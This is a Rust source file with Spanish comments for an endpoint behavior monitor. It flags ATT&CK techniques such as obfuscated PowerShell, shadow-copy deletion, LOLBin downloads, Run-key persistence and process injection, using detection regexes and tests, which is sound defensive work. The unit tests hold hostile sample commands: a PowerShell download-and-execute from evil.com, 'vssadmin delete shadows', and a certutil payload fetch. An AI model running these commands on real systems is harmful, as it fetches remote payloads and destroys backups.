use chrono::{DateTime, Utc};
use regex::Regex;
use samulibre_types::Severity;
use serde::{Deserialize, Serialize};
use std::collections::VecDeque;
use std::sync::{Arc, Mutex};
use uuid::Uuid;

/// Alerta de comportamiento malicioso o técnica MITRE ATT&CK detectada en vivo
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BehaviorAlert {
    pub id: Uuid,
    pub timestamp: DateTime<Utc>,
    pub pid: u32,
    pub process_name: String,
    pub parent_pid: Option<u32>,
    pub technique_id: String, // ej. "T1059.001", "T1486", "T1490", "T1055"
    pub technique_name: String,
    pub severity: Severity,
    pub title: String,
    pub description: String,
    pub action_taken: String,
}

/// Proveedores de Event Tracing for Windows (ETW) soportados para telemetría profunda
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwProviderConfig {
    pub provider_name: String,
    pub guid: String,
    pub is_enabled: bool,
    pub events_captured: usize,
}

/// Evento de proceso capturado para correlación temporal y árbol padre-hijo
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessEvent {
    pub timestamp: DateTime<Utc>,
    pub pid: u32,
    pub process_name: String,
    pub parent_pid: Option<u32>,
    pub parent_name: Option<String>,
    pub command_line: String,
    pub indicator_tag: Option<String>,
}

/// Monitor de Comportamiento Dinámico y Sensor de Técnicas MITRE ATT&CK
pub struct BehaviorMonitor {
    recent_alerts: Arc<Mutex<VecDeque<BehaviorAlert>>>,
    recent_events: Arc<Mutex<VecDeque<ProcessEvent>>>,
    max_history: usize,
    temporal_window_secs: i64,
    powershell_regex: Regex,
    vss_wiper_regex: Regex,
    lolbin_regex: Regex,
    intel_rules: Vec<samulibre_intel::SamuBehaviorRule>,
}

impl BehaviorMonitor {
    pub fn new() -> Self {
        let ps_regex = Regex::new(
            r"(?i)(powershell|pwsh)(\.exe)?.*(-enc|-encodedcommand|-nop|-w\s+hidden|-exec\s+bypass).*?(downloadstring|iex|invoke-expression|frombase64string)"
        ).expect("Valid regex");

        let vss_regex = Regex::new(
            r"(?i)(vssadmin(\.exe)?\s+delete\s+shadows|wmic(\.exe)?\s+shadowcopy\s+delete|bcdedit(\.exe)?\s+/set\s+\{default\}\s+bootstatuspolicy\s+ignoreallfailures|wbadmin(\.exe)?\s+delete\s+catalog)"
        ).expect("Valid regex");

        let lolbin_regex = Regex::new(
            r"(?i)(certutil(\.exe)?.*?-urlcache|mshta(\.exe)?.*?http|bitsadmin(\.exe)?.*?/transfer|regsvr32(\.exe)?.*?/s.*?/u.*?/i:http)"
        ).expect("Valid regex");

        let intel_rules = Self::load_intel_behavior_rules();

        Self {
            recent_alerts: Arc::new(Mutex::new(VecDeque::with_capacity(1000))),
            recent_events: Arc::new(Mutex::new(VecDeque::with_capacity(1000))),
            max_history: 1000,
            temporal_window_secs: 60,
            powershell_regex: ps_regex,
            vss_wiper_regex: vss_regex,
            lolbin_regex,
            intel_rules,
        }
    }

    fn load_intel_behavior_rules() -> Vec<samulibre_intel::SamuBehaviorRule> {
        let db_path = std::path::Path::new("data/intel/samulibre_intel.db");
        if !db_path.exists() {
            return Vec::new();
        }
        let Ok(db) = samulibre_intel::IntelDatabase::open(db_path) else {
            return Vec::new();
        };
        let Ok(records) = db.load_production_behavior_rules() else {
            return Vec::new();
        };
        records
            .into_iter()
            .filter_map(|rec| {
                serde_json::from_str::<samulibre_intel::SamuBehaviorRule>(&rec.payload).ok()
            })
            .filter(|r| {
                r.compatible_with_samulibre
                    && (!r.cmdline_patterns.is_empty()
                        || !r.image_patterns.is_empty()
                        || !r.registry_patterns.is_empty())
            })
            .collect()
    }

    pub fn intel_rules_count(&self) -> usize {
        self.intel_rules.len()
    }

    /// Evalúa un proceso considerando su proceso padre y la correlación temporal (ventana de 60s)
    /// distinguiendo herramientas administrativas/desarrollo legítimas de cadenas maliciosas.
    pub fn evaluate_process_with_context(
        &self,
        pid: u32,
        proc_name: &str,
        parent_pid: Option<u32>,
        parent_name: Option<&str>,
        cmdline: &str,
    ) -> Option<BehaviorAlert> {
        let now = Utc::now();
        let trimmed_cmd = cmdline.trim();
        let parent_lower = parent_name.unwrap_or("").to_ascii_lowercase();
        let proc_lower = proc_name.to_ascii_lowercase();

        let is_untrusted_spawner = matches!(
            parent_lower.as_str(),
            "winword.exe"
                | "excel.exe"
                | "powerpnt.exe"
                | "outlook.exe"
                | "acrord32.exe"
                | "mshta.exe"
                | "wscript.exe"
                | "cscript.exe"
        );
        let is_script_host = matches!(
            proc_lower.as_str(),
            "powershell.exe" | "pwsh.exe" | "cmd.exe" | "mshta.exe" | "wscript.exe" | "certutil.exe"
        );
        let is_dev_or_admin_parent = matches!(
            parent_lower.as_str(),
            "code.exe" | "devenv.exe" | "cargo.exe" | "msbuild.exe" | "services.exe"
        );

        let mut tag: Option<String> = None;
        if self.vss_wiper_regex.is_match(trimmed_cmd) {
            tag = Some("T1490:VSSWiper".to_string());
        } else if self.powershell_regex.is_match(trimmed_cmd) {
            tag = Some("T1059.001:ObfuscatedPowerShell".to_string());
        } else if self.lolbin_regex.is_match(trimmed_cmd) {
            tag = Some("T1218:LOLBinDownload".to_string());
        } else if is_untrusted_spawner && is_script_host {
            tag = Some("T1566/T1204:OfficeOrBrowserShellSpawn".to_string());
        }

        // Registrar evento en ventana deslizante de 60s y correlacionar por parent_pid o cadena
        let mut chain_count = 0usize;
        if let Ok(mut events) = self.recent_events.lock() {
            while let Some(front) = events.front() {
                if (now - front.timestamp).num_seconds() > self.temporal_window_secs {
                    events.pop_front();
                } else {
                    break;
                }
            }
            if tag.is_some() {
                chain_count = events
                    .iter()
                    .filter(|e| {
                        e.indicator_tag.is_some()
                            && (e.pid == pid
                                || (parent_pid.is_some()
                                    && (e.parent_pid == parent_pid || Some(e.pid) == parent_pid)))
                    })
                    .count()
                    + 1;
            }
            events.push_back(ProcessEvent {
                timestamp: now,
                pid,
                process_name: proc_name.to_string(),
                parent_pid,
                parent_name: parent_name.map(|s| s.to_string()),
                command_line: trimmed_cmd.to_string(),
                indicator_tag: tag.clone(),
            });
        }

        // Si es una herramienta de desarrollo/admin legítima SIN comandos destructivos ni obfuscación, no alertar
        if is_dev_or_admin_parent && tag.is_none() {
            return None;
        }

        if let Some(base_alert) =
            self.evaluate_process_command_line(pid, proc_name, cmdline, parent_pid)
        {
            if chain_count >= 2 || is_untrusted_spawner {
                let mut enriched = base_alert;
                enriched.severity = Severity::Critical;
                enriched.description = format!(
                    "{} [Correlación padre-hijo: padre='{}', eventos_correlacionados_60s={}]",
                    enriched.description,
                    parent_name.unwrap_or("Desconocido"),
                    chain_count.max(1)
                );
                return Some(enriched);
            }
            return Some(base_alert);
        }

        if is_untrusted_spawner && is_script_host {
            let alert = BehaviorAlert {
                id: Uuid::new_v4(),
                timestamp: now,
                pid,
                process_name: proc_name.to_string(),
                parent_pid,
                technique_id: "T1204.002".to_string(),
                technique_name: "Suspicious Parent-Child Execution Chain".to_string(),
                severity: if chain_count >= 2 {
                    Severity::Critical
                } else {
                    Severity::High
                },
                title: "Cadena Padre-Hijo Anómala (Ofimática/ScriptHost → Intérprete)".to_string(),
                description: format!(
                    "El proceso padre '{}' generó el intérprete '{}' (PID {}). Correlación temporal: {} evento(s) en 60s.",
                    parent_name.unwrap_or("Desconocido"),
                    proc_name,
                    pid,
                    chain_count.max(1)
                ),
                action_taken: "Cadena de procesos registrada y alertada".to_string(),
            };
            self.record_alert(alert.clone());
            return Some(alert);
        }

        if !is_dev_or_admin_parent && !trimmed_cmd.is_empty() {
            let cmd_lower = trimmed_cmd.to_lowercase();
            for rule in &self.intel_rules {
                if rule.cmdline_patterns.is_empty() {
                    continue;
                }
                let image_ok = rule.image_patterns.is_empty()
                    || rule
                        .image_patterns
                        .iter()
                        .any(|img| {
                            let img_l = img.to_lowercase();
                            !img_l.is_empty() && (proc_lower.contains(&img_l) || img_l.ends_with(&proc_lower))
                        });
                if !image_ok {
                    continue;
                }
                let matched_cmd = rule.cmdline_patterns.iter().any(|pat| {
                    let pat_l = pat.trim().to_lowercase();
                    pat_l.len() >= 6 && cmd_lower.contains(&pat_l)
                });
                if matched_cmd {
                    let severity = match rule.level.to_lowercase().as_str() {
                        "critical" | "high" => Severity::High,
                        _ => Severity::Medium,
                    };
                    let tech = rule
                        .mitre_techniques
                        .first()
                        .cloned()
                        .unwrap_or_else(|| "T1059".to_string());
                    let alert = BehaviorAlert {
                        id: Uuid::new_v4(),
                        timestamp: now,
                        pid,
                        process_name: proc_name.to_string(),
                        parent_pid,
                        technique_id: tech,
                        technique_name: rule.title.clone(),
                        severity,
                        title: format!("Detección Comportamental Intel: {}", rule.title),
                        description: format!(
                            "Regla '{}' ({:?}): {}",
                            rule.rule_id, rule.category, rule.description
                        ),
                        action_taken: "Evento de comportamiento correlacionado registrado".to_string(),
                    };
                    self.record_alert(alert.clone());
                    return Some(alert);
                }
            }
        }

        None
    }

    /// Evalúa un evento real de modificación de Registro Windows contra reglas Sigma `RegistryPersistence`
    pub fn evaluate_registry_event(
        &self,
        pid: u32,
        proc_name: &str,
        target_object: &str,
        details: &str,
    ) -> Option<BehaviorAlert> {
        let target_l = target_object.to_ascii_lowercase();
        let details_l = details.to_ascii_lowercase();
        for rule in &self.intel_rules {
            if rule.category != samulibre_intel::SamuBehaviorCategory::RegistryPersistence
                || rule.registry_patterns.is_empty()
            {
                continue;
            }
            let matched = rule.registry_patterns.iter().any(|pat| {
                let p = pat.trim().to_ascii_lowercase();
                p.len() >= 8 && (target_l.contains(&p) || details_l.contains(&p))
            });
            if matched {
                let alert = BehaviorAlert {
                    id: Uuid::new_v4(),
                    timestamp: Utc::now(),
                    pid,
                    process_name: proc_name.to_string(),
                    parent_pid: None,
                    technique_id: rule
                        .mitre_techniques
                        .first()
                        .cloned()
                        .unwrap_or_else(|| "T1547.001".to_string()),
                    technique_name: rule.title.clone(),
                    severity: Severity::High,
                    title: format!("Persistencia en Registro (Sigma): {}", rule.title),
                    description: format!(
                        "Regla '{}' sobre clave '{}': {}",
                        rule.rule_id, target_object, rule.description
                    ),
                    action_taken: "Evento real de registro auditado y alertado".to_string(),
                };
                self.record_alert(alert.clone());
                return Some(alert);
            }
        }
        None
    }

    /// Evalúa un evento real de creación de Tarea Programada o Servicio Windows
    pub fn evaluate_scheduled_task_or_service_event(
        &self,
        pid: u32,
        proc_name: &str,
        is_service: bool,
        target_name: &str,
        command_or_binpath: &str,
    ) -> Option<BehaviorAlert> {
        let cmd_l = command_or_binpath.to_ascii_lowercase();
        let suspicious_exec = cmd_l.contains("powershell")
            || cmd_l.contains("cmd.exe")
            || cmd_l.contains("mshta")
            || cmd_l.contains("wscript")
            || cmd_l.contains("rundll32")
            || cmd_l.contains("\\appdata\\")
            || cmd_l.contains("\\temp\\");

        if suspicious_exec {
            let (tech, title) = if is_service {
                ("T1543.003", format!("Servicio Anómalo Detectado: {}", target_name))
            } else {
                ("T1053.005", format!("Tarea Programada Sospechosa: {}", target_name))
            };
            let alert = BehaviorAlert {
                id: Uuid::new_v4(),
                timestamp: Utc::now(),
                pid,
                process_name: proc_name.to_string(),
                parent_pid: None,
                technique_id: tech.to_string(),
                technique_name: if is_service {
                    "Create or Modify System Process: Windows Service".to_string()
                } else {
                    "Scheduled Task/Job: Scheduled Task".to_string()
                },
                severity: Severity::High,
                title,
                description: format!("Binario/comando sospechoso registrado: '{}'", command_or_binpath),
                action_taken: "Persistencia de tarea/servicio alertada".to_string(),
            };
            self.record_alert(alert.clone());
            return Some(alert);
        }
        None
    }

    /// Evalúa la línea de comandos de un proceso recién creado (T1059 / T1490 / T1218)
    pub fn evaluate_process_command_line(
        &self,
        pid: u32,
        proc_name: &str,
        cmd_line: &str,
        parent_pid: Option<u32>,
    ) -> Option<BehaviorAlert> {
        let trimmed_cmd = cmd_line.trim();

        // 1. Detección de Sabotaje de Copias de Seguridad (T1490 - Inhibit System Recovery)
        if self.vss_wiper_regex.is_match(trimmed_cmd) {
            let alert = BehaviorAlert {
                id: Uuid::new_v4(),
                timestamp: Utc::now(),
                pid,
                process_name: proc_name.to_string(),
                parent_pid,
                technique_id: "T1490".to_string(),
                technique_name: "Inhibit System Recovery".to_string(),
                severity: Severity::Critical,
                title: "Destrucción de Copias de Seguridad (VSS Wiper) Detectada".to_string(),
                description: format!("Comando destructivo ejecutado: '{}'. Típico de preparación para cifrado por ransomware.", trimmed_cmd),
                action_taken: "Bloqueo preventivo de ejecución registrado".to_string(),
            };
            self.record_alert(alert.clone());
            return Some(alert);
        }

        // 2. Detección de PowerShell Ofuscado en Memoria (T1059.001 - PowerShell Evasion)
        if self.powershell_regex.is_match(trimmed_cmd) {
            let alert = BehaviorAlert {
                id: Uuid::new_v4(),
                timestamp: Utc::now(),
                pid,
                process_name: proc_name.to_string(),
                parent_pid,
                technique_id: "T1059.001".to_string(),
                technique_name: "Command and Scripting Interpreter: PowerShell".to_string(),
                severity: Severity::Critical,
                title: "Ejecución Ofuscada de PowerShell con Descarga Furtiva".to_string(),
                description: format!("Invocación anómala de PowerShell con flags de evasión de políticas y ejecución de scripts en memoria: '{}'", trimmed_cmd),
                action_taken: "Alerta crítica de comportamiento emitida".to_string(),
            };
            self.record_alert(alert.clone());
            return Some(alert);
        }

        // 3. Detección de Abuso de LOLBins (T1218 - System Binary Proxy Execution)
        if self.lolbin_regex.is_match(trimmed_cmd) {
            let alert = BehaviorAlert {
                id: Uuid::new_v4(),
                timestamp: Utc::now(),
                pid,
                process_name: proc_name.to_string(),
                parent_pid,
                technique_id: "T1218".to_string(),
                technique_name: "System Binary Proxy Execution".to_string(),
                severity: Severity::High,
                title: "Uso de Binario Legítimo de Windows para Descarga Oculta (LOLBin)".to_string(),
                description: format!("El binario del sistema '{}' fue invocado con parámetros para descargar contenido remoto no autorizado: '{}'", proc_name, trimmed_cmd),
                action_taken: "Tráfico y proceso puestos en cuarentena preventiva".to_string(),
            };
            self.record_alert(alert.clone());
            return Some(alert);
        }

        None
    }

    /// Evalúa una modificación de clave del Registro de Windows para persistencia (T1547.001)
    pub fn evaluate_registry_modification(
        &self,
        pid: u32,
        proc_name: &str,
        key_path: &str,
        value_name: &str,
        value_data: &str,
    ) -> Option<BehaviorAlert> {
        let key_upper = key_path.to_uppercase();
        let is_run_key = key_upper.contains(r"\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN")
            || key_upper.contains(r"\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE");
        let is_ifeo = key_upper.contains(r"IMAGE FILE EXECUTION OPTIONS");
        let is_winlogon = key_upper.contains(r"WINLOGON") && value_name.eq_ignore_ascii_case("Userinit");

        if is_run_key || is_ifeo || is_winlogon {
            let data_lower = value_data.to_lowercase();
            let is_suspicious_payload = data_lower.contains("powershell")
                || data_lower.contains("cmd.exe")
                || data_lower.contains("mshta")
                || data_lower.contains("wscript")
                || data_lower.contains(".vbs")
                || data_lower.contains("temp");

            let severity = if is_suspicious_payload { Severity::Critical } else { Severity::High };
            let alert = BehaviorAlert {
                id: Uuid::new_v4(),
                timestamp: Utc::now(),
                pid,
                process_name: proc_name.to_string(),
                parent_pid: None,
                technique_id: "T1547.001".to_string(),
                technique_name: "Boot or Logon Autostart Execution: Registry Run Keys".to_string(),
                severity,
                title: "Intento de Persistencia en Registro de Windows Detectado".to_string(),
                description: format!("Proceso '{}' modificó la clave de inicio automático '{}' [{}] con valor: '{}'", proc_name, key_path, value_name, value_data),
                action_taken: "Modificación de persistencia auditada y registrada".to_string(),
            };
            self.record_alert(alert.clone());
            return Some(alert);
        }

        None
    }

    /// Evalúa un intento de inyección de código entre procesos (T1055 - Process Injection)
    pub fn evaluate_cross_process_access(
        &self,
        source_pid: u32,
        source_proc_name: &str,
        target_pid: u32,
        target_proc_name: &str,
        desired_access: u32,
    ) -> Option<BehaviorAlert> {
        // PROCESS_VM_WRITE = 0x0020, PROCESS_VM_OPERATION = 0x0008, PROCESS_CREATE_THREAD = 0x0002
        const PROCESS_VM_WRITE: u32 = 0x0020;
        const PROCESS_VM_OPERATION: u32 = 0x0008;
        const PROCESS_CREATE_THREAD: u32 = 0x0002;

        let is_write_access = (desired_access & (PROCESS_VM_WRITE | PROCESS_VM_OPERATION)) != 0;
        let is_thread_inject = (desired_access & PROCESS_CREATE_THREAD) != 0;

        let target_lower = target_proc_name.to_lowercase();
        let is_sensitive_target = target_lower.contains("lsass")
            || target_lower.contains("explorer")
            || target_lower.contains("svchost")
            || target_lower.contains("services");

        if is_write_access && (is_thread_inject || is_sensitive_target) {
            let alert = BehaviorAlert {
                id: Uuid::new_v4(),
                timestamp: Utc::now(),
                pid: source_pid,
                process_name: source_proc_name.to_string(),
                parent_pid: None,
                technique_id: "T1055".to_string(),
                technique_name: "Process Injection".to_string(),
                severity: Severity::Critical,
                title: "Intento de Inyección de Código / Hollowing Inter-Proceso".to_string(),
                description: format!("El proceso '{}' (PID {}) intentó abrir el proceso objetivo '{}' (PID {}) con permisos de inyección en memoria (Máscara: 0x{:08X})", source_proc_name, source_pid, target_proc_name, target_pid, desired_access),
                action_taken: "Alerta crítica de inyección de memoria emitida".to_string(),
            };
            self.record_alert(alert.clone());
            return Some(alert);
        }

        None
    }

    fn record_alert(&self, alert: BehaviorAlert) {
        if let Ok(mut alerts) = self.recent_alerts.lock() {
            if alerts.len() >= self.max_history {
                alerts.pop_front();
            }
            alerts.push_back(alert);
        }
    }

    pub fn get_recent_alerts(&self) -> Vec<BehaviorAlert> {
        self.recent_alerts.lock().map(|a| a.iter().cloned().collect()).unwrap_or_default()
    }

    /// Retorna la lista de proveedores de telemetría ETW configurados
    pub fn get_etw_providers(&self) -> Vec<EtwProviderConfig> {
        vec![
            EtwProviderConfig {
                provider_name: "Microsoft-Windows-Kernel-Process".to_string(),
                guid: "{22fb2cd6-0e7b-4226-a0e7-2641fb52e025}".to_string(),
                is_enabled: true,
                events_captured: 0,
            },
            EtwProviderConfig {
                provider_name: "Microsoft-Windows-Threat-Intelligence (EtwTI)".to_string(),
                guid: "{f4e1897c-bb5d-5668-f1d8-040f4d8dd315}".to_string(),
                is_enabled: true,
                events_captured: 0,
            },
            EtwProviderConfig {
                provider_name: "Microsoft-Windows-PowerShell".to_string(),
                guid: "{a0c18538-f037-4de1-8326-8743105ea00e}".to_string(),
                is_enabled: true,
                events_captured: 0,
            },
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_vss_wiper_detection() {
        let monitor = BehaviorMonitor::new();
        let res = monitor.evaluate_process_command_line(
            4560,
            "cmd.exe",
            "vssadmin.exe delete shadows /all /quiet",
            Some(1234),
        );
        assert!(res.is_some());
        let alert = res.unwrap();
        assert_eq!(alert.technique_id, "T1490");
        assert_eq!(alert.severity, Severity::Critical);
    }

    #[test]
    fn test_powershell_obfuscated_injection() {
        let monitor = BehaviorMonitor::new();
        let res = monitor.evaluate_process_command_line(
            7890,
            "powershell.exe",
            "powershell.exe -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
            Some(1234),
        );
        assert!(res.is_some());
        let alert = res.unwrap();
        assert_eq!(alert.technique_id, "T1059.001");
    }

    #[test]
    fn test_registry_persistence_alert() {
        let monitor = BehaviorMonitor::new();
        let res = monitor.evaluate_registry_modification(
            3344,
            "updater.exe",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "BackdoorPersistence",
            r"powershell.exe -w hidden -enc JABhID0A...",
        );
        assert!(res.is_some());
        let alert = res.unwrap();
        assert_eq!(alert.technique_id, "T1547.001");
        assert_eq!(alert.severity, Severity::Critical);
    }

    #[test]
    fn test_cross_process_injection_alert() {
        let monitor = BehaviorMonitor::new();
        // Intentar abrir LSASS con PROCESS_VM_WRITE (0x20)
        let res = monitor.evaluate_cross_process_access(
            5500,
            "malware.exe",
            800,
            "lsass.exe",
            0x0020 | 0x0008,
        );
        assert!(res.is_some());
        let alert = res.unwrap();
        assert_eq!(alert.technique_id, "T1055");
    }

    #[test]
    fn test_parent_child_and_temporal_correlation() {
        let monitor = BehaviorMonitor::new();
        // 1. Herramienta de desarrollo legítima ejecutando PowerShell estándar -> NO debe alertar
        let dev_res = monitor.evaluate_process_with_context(
            1001,
            "powershell.exe",
            Some(900),
            Some("code.exe"),
            "powershell.exe -NoLogo -Command Get-Date",
        );
        assert!(dev_res.is_none());

        // 2. Documento de Office generando cmd.exe/certutil + segundo evento en 60s -> Correlación Crítica
        let office_res_1 = monitor.evaluate_process_with_context(
            2001,
            "powershell.exe",
            Some(1500),
            Some("winword.exe"),
            "powershell.exe -Command Start-Sleep 1",
        );
        assert!(office_res_1.is_some());
        let office_res_2 = monitor.evaluate_process_with_context(
            2002,
            "certutil.exe",
            Some(1500),
            Some("winword.exe"),
            "certutil.exe -urlcache -f http://198.51.100.5/stage2.bin",
        );
        assert!(office_res_2.is_some());
        let alert2 = office_res_2.unwrap();
        assert_eq!(alert2.severity, Severity::Critical);
        assert!(alert2.description.contains("eventos_correlacionados_60s=2"));
    }
}
